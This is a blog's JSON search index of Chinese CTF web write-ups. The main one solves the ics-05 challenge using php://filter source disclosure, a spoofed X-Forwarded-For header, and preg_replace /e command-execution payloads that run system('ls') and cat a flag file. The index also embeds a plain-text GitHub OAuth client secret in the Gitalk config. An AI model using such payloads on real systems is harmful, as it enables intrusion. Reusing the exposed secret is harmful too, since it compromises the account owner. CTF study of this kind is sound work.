{"meta":{"title":"MR-eggegg","subtitle":"boko","description":"kobo","author":"egg","url":"http://yoursite.com","root":"/"},"pages":[{"title":"tags","date":"2019-12-23T17:42:01.000Z","updated":"2019-12-24T03:34:47.034Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-23T17:38:51.000Z","updated":"2019-12-24T03:34:47.033Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"post-boko1","slug":"post-boko1","date":"2019-12-24T03:34:47.029Z","updated":"2019-12-24T11:59:22.870Z","comments":true,"path":"2019/12/24/post-boko1/","link":"","permalink":"http://yoursite.com/2019/12/24/post-boko1/","excerpt":"","text":"— title: post_boko1 date: 2019-12-24 11:06:00 tags: —","categories":[],"tags":[]},{"title":"CTF攻防世界-WEB-cookie基础题","slug":"pb基础","date":"2019-12-23T15:30:33.000Z","updated":"2019-12-26T15:26:11.177Z","comments":true,"path":"2019/12/24/pb基础/","link":"","permalink":"http://yoursite.com/2019/12/24/pb%E5%9F%BA%E7%A1%80/","excerpt":"","text":"0x01 攻防世界web新手区cookie题 常规网上搜到的都是用burp suits做的，其实没必要这么麻烦，查看问题的讨论发现可以直接通过火狐浏览器 F12查看存储，获得cookie，然后查看网络获得flag Chrome浏览器可以通过控制台输入alert(document.cookie)查看cookie cookie 0x02 图流程 var gitalk = new Gitalk({ // gitalk的主要参数 clientID: &apos;dcf239aa6b46fcf244a3&apos;, clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;, repo: &apos;MR-eggegg.github.io&apos;, owner: &apos;MR-eggegg&apos;, admin: [&apos;MR-eggegg&apos;], id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;, }); gitalk.render(&apos;gitalk-container&apos;);","categories":[{"name":"CTF-WEB基础","slug":"CTF-WEB基础","permalink":"http://yoursite.com/categories/CTF-WEB%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"抓包基础题","slug":"抓包基础题","permalink":"http://yoursite.com/tags/%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80%E9%A2%98/"}]},{"title":"CTF攻防世界-WEB-cis05","slug":"ctf-ics-05","date":"2019-12-23T15:30:33.000Z","updated":"2019-12-26T15:58:55.212Z","comments":true,"path":"2019/12/24/ctf-ics-05/","link":"","permalink":"http://yoursite.com/2019/12/24/ctf-ics-05/","excerpt":"0x01 前要 1.php内置封装协议 filter2.伪造IP3.preg_replace()函数的/e漏洞4.正确的php system()函数的书写","text":"0x01 前要 1.php内置封装协议 filter2.伪造IP3.preg_replace()函数的/e漏洞4.正确的php system()函数的书写 0x02 解题流程 1.打开题目网页点击尝试，发现只有维护中心可以点击 F12查看源代码，可以看到代码段?page=index，同时网页表现为 xxxx/index.php，此时可以猜测题目可能为文件包含读取网页的漏洞。利用php内置filter协议协助网页传参，查看结果。 2_1. 1&lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt; 2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。 1?page=php://filter/read=convert.base64-encode/resource=index.php 3.转码获得源码 12345678910111213if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125; 3_1.代码审计（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP（1_1）可以看到我们登陆成功 （2）preg_replace危险的/e修饰符 简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明 1234567preg_replace ($pattern , $replacement , $subject [, int $limit = -1 [, int &amp;$count ]] )$pattern: 搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组。关于/e： 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。 潜在威胁： 当replacement为可控时，可以直接编写一句话木马 （2_2）利用漏洞寻找flag %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令 1/index.php?pat=/test/e&amp;rep=system(\"ls\")&amp;sub=haha%20test (2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹 1/index.php?pat=/test/e&amp;rep=system(\"cd%20s3chahahaDir%26%26%20ls\")&amp;sub=haha%20test （2_4）找到flag文件夹后，继续cd，寻找所需的flag 1/index.php?pat=/test/e&amp;rep=system(\"cd%20s3chahahaDir/flag%26%26%20ls\")&amp;sub=haha%20test (2_5)确认flag所在的文件，直接抓取内容 1/index.php?pat=/test/e&amp;rep=system(\"cat%20s3chahahaDir/flag/flag.php\")&amp;sub=haha%20test 成功找到flag 0x03 解题过程中存在的问题 1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试 0x04 参考 1.攻防世界web进阶ics-05 wp 2.preg_replace危险的/e修饰符 3.攻防世界ics-5wp var gitalk = new Gitalk({ // gitalk的主要参数 clientID: &apos;dcf239aa6b46fcf244a3&apos;, clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;, repo: &apos;MR-eggegg.github.io&apos;, owner: &apos;MR-eggegg&apos;, admin: [&apos;MR-eggegg&apos;], id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;, }); gitalk.render(&apos;gitalk-container&apos;);","categories":[{"name":"CTF-WEB","slug":"CTF-WEB","permalink":"http://yoursite.com/categories/CTF-WEB/"}],"tags":[{"name":"php内置filter协议","slug":"php内置filter协议","permalink":"http://yoursite.com/tags/php%E5%86%85%E7%BD%AEfilter%E5%8D%8F%E8%AE%AE/"},{"name":"伪造IP","slug":"伪造IP","permalink":"http://yoursite.com/tags/%E4%BC%AA%E9%80%A0IP/"},{"name":"preg_replace()函数的/e漏洞","slug":"preg-replace-函数的-e漏洞","permalink":"http://yoursite.com/tags/preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84-e%E6%BC%8F%E6%B4%9E/"},{"name":"正确的php system()函数的书写","slug":"正确的php-system-函数的书写","permalink":"http://yoursite.com/tags/%E6%AD%A3%E7%A1%AE%E7%9A%84php-system-%E5%87%BD%E6%95%B0%E7%9A%84%E4%B9%A6%E5%86%99/"}]},{"title":"低估的Web威胁-备份文件","slug":"低估的Web威胁","date":"2019-12-23T15:15:36.000Z","updated":"2019-12-24T07:54:55.446Z","comments":true,"path":"2019/12/24/低估的Web威胁/","link":"","permalink":"http://yoursite.com/2019/12/24/%E4%BD%8E%E4%BC%B0%E7%9A%84Web%E5%A8%81%E8%83%81/","excerpt":"","text":"0x01代码编辑器产生的备份文件 文本编辑器和代码编辑器通常对正在编辑的文件会事先产生一个备份文件，这样做的目的是让出问题后可以恢复文件。 例如：对一个名为index.php的文件进行编辑，自动创建的备份文件将会被命名成“index.php.save”。其他的代码编辑器也是一样的，都有一套自己的备份规则。 0x02没有删除版本控制系统产生的备份文件 几乎所有的控制系统VCS都会在工程目录下建一个meta目录，这个文件记录了整个项目工程每次修改的记录。 而开发者修改项目仓库的时候就直接下载/克隆代码仓库，改为后直接上传到web服务器上。但是很多时候，VCS产生的目录并没有删除掉，这样的话，如果被攻击者找到，将会使整个工程泄露。 default 1234567891011# gif 二进制转字符串import rea = '01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101'b = re.findall(r'.&#123;8&#125;',a)flag = ''for i in b: flag += chr(int(i,2))print(flag)","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"备份文件","slug":"备份文件","permalink":"http://yoursite.com/tags/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/"},{"name":"CTF-WEB基础知识","slug":"CTF-WEB基础知识","permalink":"http://yoursite.com/tags/CTF-WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]}]}